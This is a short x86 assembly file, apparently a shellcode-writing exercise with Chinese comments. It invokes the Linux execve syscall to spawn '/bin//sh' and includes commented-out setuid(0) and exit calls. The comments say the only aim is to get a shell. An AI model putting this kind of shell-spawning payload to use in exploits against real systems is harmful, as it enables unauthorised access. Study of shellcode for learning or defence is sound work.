section .data
	string db '/bin//sh'
section .text
global _start
	_start:
	; setuid
	; 暂时并不需要获取 root 权限
	; mov eax, 00d5H
	; mov ebx, 0
	; int 80H
	; execve
	mov al, 0BH
	mov ebx, string
	xor ecx, ecx
	xor edx, edx
	int 80H
	; exit
	; 我们的目的是得到一个 shell , 并不关心程序是否可以正常退出
	; mov eax, 1
	; mov ebx, 0
	; int 80H


